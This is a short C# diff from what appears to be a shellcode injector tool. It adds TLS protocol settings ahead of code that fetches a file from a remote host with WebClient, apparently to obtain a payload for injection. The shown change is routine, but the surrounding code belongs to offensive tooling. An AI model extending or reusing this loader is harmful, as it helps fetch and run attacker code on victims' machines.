@@ -28,6 +28,7 @@ namespace Shellcode_Injector
         {
             try
             {
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
                 Console.WriteLine($"Fetching {file} from {host}");
                 WebClient client = new WebClient();
                 client.BaseAddress = host;
